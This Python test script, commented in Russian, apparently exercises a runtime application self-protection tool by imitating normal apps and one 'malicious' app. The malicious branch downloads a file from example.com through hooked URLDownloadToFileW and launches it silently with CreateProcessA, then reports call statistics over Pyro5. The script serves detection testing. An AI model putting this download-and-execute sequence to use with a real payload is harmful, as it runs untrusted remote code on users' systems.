import os
import time
import random
import ctypes
import sys
import importlib
import Pyro5.api
import detours_wrapper  # Добавлен импорт detours_wrapper

from ctypes import byref
from ctypes_structures import STARTUPINFOA, PROCESS_INFORMATIONA, LP_STARTUPINFOA, LP_PROCESS_INFORMATIONA

URLDownloadToFileW = detours_wrapper._hooked_URLDownloadToFile
CreateProcessA = detours_wrapper._hooked_CreateProcessA

def imitate_application_behavior(app_name, malicious=False):
    print(f"Запуск приложения {app_name}")

    # Имитация нормальной работы приложения
    for _ in range(5):
        time.sleep(random.uniform(0.5, 2))
        if not malicious:
            print(f"{app_name}: Имитация работы")

    # Имитация вредоносного поведения
    if malicious:
        url = "https://www.example.com/"
        file_name = "example.html"
        command_line = f"{file_name} --silent"
        command_line_bytes = command_line.encode('utf-8')

        print(f"{app_name}: Внедрение вредоносного кода")
        URLDownloadToFileW(None, url, file_name, 0, None)
        time.sleep(random.uniform(0.1, 0.5))

        startup_info = STARTUPINFOA()
        startup_info.cb = ctypes.sizeof(startup_info)
        process_info = PROCESS_INFORMATIONA()

        CreateProcessA(None, command_line_bytes, None, None, False, 0, None, None, LP_STARTUPINFOA(startup_info), LP_PROCESS_INFORMATIONA(process_info))
        print(f"Завершение работы приложения {app_name}")

        # Получение ссылки на RASPApp
        rasp_app = Pyro5.api.Proxy("PYRONAME:rasp_app")

        # Вызов функций, определенных в main.py
        rasp_app.on_update_calls_stats(1, 0)

if __name__ == "__main__":
    # Тестирование с простой консольной программой
    imitate_application_behavior("SimpleConsoleApp")

    # Тестирование с Microsoft Word
    imitate_application_behavior("Microsoft Word")

    # Тестирование с Microsoft Excel
    imitate_application_behavior("Microsoft Excel")

    # Тестирование с вредоносным поведением
    imitate_application_behavior("MaliciousApp", malicious=True)
